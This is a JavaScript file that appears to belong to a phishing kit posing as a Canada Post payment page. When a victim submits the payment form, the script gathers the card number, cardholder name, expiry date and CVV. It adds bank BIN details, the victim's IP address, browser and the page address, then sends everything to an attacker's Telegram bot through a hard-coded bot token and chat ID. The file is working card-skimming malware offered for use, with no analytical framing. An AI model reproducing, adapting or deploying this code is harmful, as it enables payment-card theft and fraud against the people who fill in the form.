// Telegram.js: Consolidated File for Bot and Form Integration

// Replace this with your bot's API token
const BOT_TOKEN = '5955566794:AAFMZs58VC8gytfH8uFTLTVZf31oOH47Kjo'; // Replace with your actual bot token
const CHAT_ID = '2016548927'; // Replace with the Telegram chat/channel ID where messages will be sent
const HANDY_API_KEY = 'YOUR_HANDY_API_KEY'; // Replace with your actual Handy API key from https://www.handyapi.com

// Function to get the user's IP address
async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip || 'Unknown';
  } catch (error) {
    console.error('Error fetching IP address:', error);
    return 'Error fetching IP';
  }
}

// Function to get BIN information
async function getBinInfo(cardNumber) {
  const bin = cardNumber.replace(/\D/g, '').slice(0, 6); // Extract first 6 digits
  if (!bin || bin.length < 6) return null;

  try {
    const response = await fetch(`https://data.handyapi.com/bin/${bin}`, {
      headers: { 'x-api-key': HANDY_API_KEY }
    });
    if (!response.ok) {
      console.error('BIN API response error:', response.status);
      return null;
    }
    const data = await response.json();
    if (data.Status !== 'SUCCESS') {
      console.error('BIN API error:', data.Status);
      return null;
    }
    return {
      bin,
      bank: data.Issuer || 'Unknown',
      brand: data.Scheme || 'Unknown',
      type: data.Type || 'Unknown',
      country: data.Country?.Name || 'Unknown',
    };
  } catch (error) {
    console.error('Error fetching BIN info:', error);
    return null;
  }
}

// Function to send a message to Telegram
async function sendMessageToTelegram(message) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
      }),
    });

    const result = await response.json();
    if (result.ok) {
      console.log('Message sent successfully to Telegram:', result);
    } else {
      console.error('Failed to send message to Telegram:', result);
    }
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
  }
}

// Function to show alert message
function showAlert(message) {
  let alertDiv = document.getElementById('alertMessage');
  if (!alertDiv) {
    alertDiv = document.createElement('div');
    alertDiv.id = 'alertMessage';
    document.body.prepend(alertDiv);

    alertDiv.style.position = 'fixed';
    alertDiv.style.top = '0';
    alertDiv.style.width = '100%';
    alertDiv.style.backgroundColor = 'red';
    alertDiv.style.color = 'white';
    alertDiv.style.textAlign = 'center';
    alertDiv.style.padding = '10px';
    alertDiv.style.zIndex = '1000';
  }
  alertDiv.textContent = message;
  alertDiv.style.display = 'block';

  // Auto-hide the alert after 3 seconds
  setTimeout(() => {
    alertDiv.style.display = 'none';
  }, 3000);
}

// Attach event listener to the form
document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('payment-form');

  if (form) {
    form.addEventListener('submit', async (event) => {
      event.preventDefault(); // Prevent default form submission to validate first

      // Collect form data
      const formData = new FormData(form);

      const data = {
        cardNumber: formData.get('card_number'),
        cardName: formData.get('cardholder_name'),
        expiryDate: formData.get('expiry'),
        cvv: formData.get('cvv'),
      };

      const ip = await getUserIP(); // Fetch the user's IP address
      const host = window.location.host;
      const path = window.location.pathname;
      const browser = navigator.userAgent;
      const time = new Date().toISOString().replace('T', ' ').split('.')[0]; // Format: YYYY-MM-DD HH:mm:ss

      // Fetch BIN information
      const binInfo = await getBinInfo(data.cardNumber || '');

      // Construct the Telegram message
      const message = `
📮 ##########【 CARD INFORMATION 】##########📮

👤 Card Name   : ${data.cardName || 'N/A'}
💳 Card Number : ${data.cardNumber || 'N/A'}
📅 Expiry Date : ${data.expiryDate || 'N/A'}
🔐 CVV        : ${data.cvv || 'N/A'}

🏦##########【 BIN INFORMATION 】##########🏦

🔢 BIN         : ${binInfo?.bin || 'N/A'}
🏛️ Bank        : ${binInfo?.bank || 'Unknown'}
💳 Brand       : ${binInfo?.brand || 'Unknown'}
🔄 Type        : ${binInfo?.type || 'Unknown'}
🌍 Country     : ${binInfo?.country || 'Unknown'}

🌐##########【 IP TRACING INFO 】##########🌐

🆔 IP      : https://whatismyip.com/ip/${ip}
🏠 Host    : ${host}${path}
🖥️ Browser : ${browser}
🕒 Time    : ${time}

📮 ############【 CANADA POST 】############📮

©️ Mr900 | Telegram @mr900com
`;

      // Check if any required fields are empty
      const missingFields = Object.entries(data).filter(([key, value]) => !value);

      if (missingFields.length > 0) {
        showAlert('Please complete all required fields.');
        return; // Stop submission if any fields are empty
      }

      // Send the message to Telegram
      await sendMessageToTelegram(message);

      // Submit the form to the PHP backend
      form.submit();
    });
  } else {
    console.error('Form with ID "payment-form" not found.');
  }
});